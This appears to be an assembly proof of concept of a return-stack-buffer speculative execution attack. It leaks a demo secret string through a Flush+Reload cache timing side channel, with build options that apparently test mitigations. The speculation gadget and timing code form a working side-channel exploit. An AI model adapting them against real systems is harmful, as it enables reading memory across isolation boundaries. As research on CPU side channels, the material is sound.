global main

;;; exports
; variables
global runs
global pagesize
global threshold
global secretstringlen
global freq
global secretstring
global _mem
global mem
global secret
global leaked
; functions
global detect_flush_reload_threshold
global flush_shared_memory
global speculate
global perform_flush_reload
global leak_byte
global dead_code

;;; imports
; variables
extern kPtrTagMask
; functions
extern exit
extern memset
extern printf
; extern sysconf
; extern malloc
; extern free
; extern memcpy

; --- initialized global constants
section .data
runs:               dq 1
threshold:          dq 100
secretstring:       db "INACCESSIBLE SECRET", 0x00
secretstringlen:    dq 20
fmt_leak_buffer:    db "leaked: %s", 0x0a, 0x00
fmt_secret_buffer:  db "secret: %s", 0x0a, 0x00
fmt_dead_code:      db "Dead code. Should not be printed!", 0x0a, 0x00
fmt_enomem:         db "ERROR: ENOMEM: malloc returned Null!", 0x0a, 0x00
fmt_freq_int:       db " %3d", 0x00
fmt_freq_char:      db " %c", 0x00
fmt_leaked_hex:     db "%02x ", 0x00
fmt_nl:             db 0x0a, 0x00
fmt_mem_ptr:        db "mem               @ %p", 0x0a, 0x00
fmt_secret_ptr:     db "secret            @ %p", 0x0a, 0x00
fmt_thresh:         db "threshold:  %d ", 0x0a, 0x00
fmt_cache_miss:     db "cache miss: %ld", 0x0a, 0x00
fmt_cache_hit:      db "cache hit:  %ld", 0x0a, 0x00
fmt_access:         db "access:           @ %p", 0x0a, 0x00
fmt_access_time:    db "access time: %4ld @ %p", 0x0a, 0x00
;------

; --- uninitialized global variables
section .bss
pagesize:   resq 1   ; uint64_t pagesize
_mem:       resq 1   ; char *_mem
mem:        resq 1   ; char *mem
secret:     resq 1   ; char *secret
target:     resq 1   ; char *target
leaked:     resq 1   ; char *leaked
freq:       resd 256 ; int freq[256]

; --- code
section .text

%macro mask_rdi 0
    mov rax, [kPtrTagMask]
    not rax
    and rax, rdi
    mov rdi, [leaked]
    and rdi, [kPtrTagMask]
    or rdi, rax
%endmacro

%define endbr64 db 0xF3, 0x0F, 0x1E, 0xFA
%macro icet_endbranch 0
    %ifdef ICET
        endbr64
    %endif
%endmacro

%ifdef DEBUG
    print_newline:
        icet_endbranch
        lea rdi, [fmt_nl]
        xor rax, rax
        call printf
        ret

    print_cache_hit:
        icet_endbranch
        mov rsi, rdi
        lea rdi, [fmt_cache_hit]
        xor rax, rax
        call printf
        ret

    print_cache_miss:
        icet_endbranch
        mov rsi, rdi
        lea rdi, [fmt_cache_miss]
        xor rax, rax
        call printf
        ret

    print_threshold:
        icet_endbranch
        mov rsi, rdi
        lea rdi, [fmt_thresh]
        xor rax, rax
        call printf
        ret

    print_freq:
        icet_endbranch
        push r15
        mov r15, 'A'
        print_freq_loop:
            icet_endbranch
            lea rdi, [fmt_freq_int]
            mov rax, r15
            shl rax, 2
            xor rsi, rsi
            mov esi, [freq + rax]
            xor rax, rax
            call printf
            inc r15
            cmp r15, 'Z'
            jne print_freq_loop
        lea rdi, [fmt_nl]
        xor rax, rax
        call printf
        pop r15
        ret

    print_mem_ptr:
        icet_endbranch
        mov rsi, rdi
        lea rdi, [fmt_mem_ptr]
        xor rax, rax
        call printf
        ret

    print_secret_ptr:
        icet_endbranch
        mov rsi, rdi
        lea rdi, [fmt_secret_ptr]
        xor rax, rax
        call printf
        ret

    print_access_time:
        icet_endbranch
        mov rdx, rsi
        mov rsi, rdi
        lea rdi, [fmt_access_time]
        xor rax, rax
        call printf
        ret

    print_leaked_buffer:
        icet_endbranch
        mov rsi, rdi
        lea rdi, [fmt_leak_buffer]
        xor rax, rax
        call printf
        ret
    
    print_leaked_buffer_hex:
        icet_endbranch
        push r15
        push r14

        mov r15, rdi
        xor r14, r14
        print_leaked_buffer_hex_loop:
            icet_endbranch
            lea rdi, [fmt_leaked_hex]
            mov rax, [leaked]
            add rax, r14
            xor rsi, rsi
            mov sil, BYTE [rax]
            xor rax, rax
            call printf

            inc r14
            cmp r14, [secretstringlen]
            jl print_leaked_buffer_hex_loop
        call print_newline

        pop r14
        pop r15
        ret

    print_secret_buffer:
        icet_endbranch
        mov rsi, rdi
        lea rdi, [fmt_secret_buffer]
        xor rax, rax
        call printf
        ret
%endif ;DEBUG

;
; void flush_shared_memory()
;
flush_shared_memory:
    icet_endbranch
    push r15
    mov r15, 0
    mov rax, [mem]
    flush_shared_memory_loop:
        icet_endbranch
        clflush [rax]
        add rax, [pagesize]
        inc r15
        cmp r15, 256
        jl flush_shared_memory_loop
    pop r15
    mfence
    lfence
    ret

;
; void flush(void *addr)
;
flush:
    icet_endbranch
    clflush [rdi]
    mfence
    lfence
    ret

;
; uint64_t reload(void *addr)
;
reload:
    icet_endbranch
    mfence
    lfence
    rdtsc
    shl rdx, 32
    or rax, rdx
    mov r8, rax
    lfence

    mov al, BYTE [rdi]

    lfence
    rdtsc
    shl rdx, 32
    or rax, rdx
    sub rax, r8
    ret

;
; uint64_t detect_flush_reload_threshold(void *addr)
;
detect_flush_reload_threshold:
    icet_endbranch
    push r15
    push r14
    push r13
    push r12
    mov r15, rdi
    mov r14, 0x0fffffffffffffff ; miss time minimum
    xor r13, r13                ; hit time average

    xor r12, r12
    detect_flush_reload_threshold_loop:
        icet_endbranch
        mov rdi, r15
        call flush
        mov rdi, r15
        call reload
        cmp rax, r14
        jge detect_flush_reload_threshold_slower_miss
            mov r14, rax
        detect_flush_reload_threshold_slower_miss:
        icet_endbranch

        mov al, [r15]
        mov rdi, r15
        call reload
        add r13, rax

        inc r12
        cmp r12, 4096
        jne detect_flush_reload_threshold_loop
    shr r13, 12

    %ifdef DEBUG
        mov rdi, r13
        call print_cache_hit
        mov rdi, r14
        call print_cache_miss
    %endif ; DEBUG

    mov rax, r13
    add rax, r14
    shr rax, 1
    pop r12
    pop r13
    pop r14
    pop r15
    ret

;
; int flush_reload(void *addr)
;
flush_reload:
    push r15
    call reload
    mov r15, rax

    xor rax, rax
    cmp r15, [threshold]
    jge flush_reload_miss
        inc rax
    flush_reload_miss:
    call flush
    pop r15
    ret

;
; void slow_return(void *addr)
;
slow_return:
    icet_endbranch
    pop rax
    push rdi
    %ifdef DIV_RETURN
        mov rcx, 2147476866
        mov rax, 1792388078
        mov rdx, 1983325987
        div ecx
        div ecx
        div ecx
        div ecx
        div ecx
        div ecx
        sub rdx, 512    ; rdx = 512 - 512 = 0
        add [rsp], rdx
    %else
        clflush [rsp]
        mfence
        lfence
    %endif
    %ifdef RETURN
        ret
    %else
        pop rdi
        jmp rdi
    %endif

; push dead_code to separate page
align 4096
%ifdef ICET
    %rep 4086
        nop
    %endrep
%else
    %rep 4090 ; 4096 - len(speculate) = 4096 - 6
        nop
    %endrep
%endif
;
; void speculate()
;
speculate:
    icet_endbranch
    ; trigger RSB speculation to dead code
    pop rdi
    call slow_return    ; return from this function

    ; vvvvvvvvvv dead code begin vvvvvvvvvv
dead_code:
    icet_endbranch
    %ifdef SERIALIZE_SW
        cpuid
    %endif
    mov rdi, [target]
    %ifdef SCENARIO1
        mask_rdi
    %endif
    xor rax, rax
    mov al, [rdi]             ; target access

    imul rax, QWORD [pagesize]
    mov rdi, [mem]
    mov rax, [rdi + rax]      ; cache encode

    lea rdi, [fmt_dead_code]
    xor rax, rax
    call printf

    mov rdi, -1
    call exit
    ; ^^^^^^^^^^ dead code end ^^^^^^^^^^
align 4096

;
; void perform_flush_reload()
;
perform_flush_reload:
    icet_endbranch
    push r14
    push r13
    xor r14, r14
    perform_flush_reload_loop:
        icet_endbranch
        mov r13, r14
        imul r13, 167
        add r13, 13
        and r13, 0xff

        mov rdx, [pagesize]
        imul rdx, r13
        mov rdi, [mem]
        add rdi, rdx
        call flush_reload

        test rax, rax
        jz perform_flush_reload_leak_byte_no_hit
            cmp r13, 'A'
            jl perform_flush_reload_leak_byte_no_hit
            cmp r13, 'Z'
            jg perform_flush_reload_leak_byte_no_hit
                add [freq + 4 * r13], DWORD 1
        perform_flush_reload_leak_byte_no_hit:
        icet_endbranch
        inc r14
        cmp r14, 256
        jne perform_flush_reload_loop
    pop r13
    pop r14
    ret

;
; char leak_byte(uint64_t idx)
;
leak_byte:
    icet_endbranch
    push r15
    push r14
    push r13

    mov rax, [secret]
    add rax, rdi
    mov [target], rax

    lea rdi, [freq]
    xor rsi, rsi
    mov rdx, 1024 ; 256 * int = 256 * 4 byte = 1024
    call memset

    xor r15, r15
    leak_byte_run:
        icet_endbranch
        call flush_shared_memory

        call speculate
        %ifndef RETURN
            icet_endbranch
        %endif

        call perform_flush_reload

        inc r15
        cmp r15, [runs]
        jne leak_byte_run
    xor rax, rax
    xor rcx, rcx
    xor r15, r15
    leak_byte_ans:
        icet_endbranch
        mov edx, [freq + 4 * r15]
        cmp edx, ecx
        jle leak_byte_smaller
            mov ecx, edx
            mov rax, r15
        leak_byte_smaller:
        icet_endbranch
        inc r15
        cmp r15, 256
        jne leak_byte_ans
    ; call print_freq
    pop r13
    pop r14
    pop r15
    ret
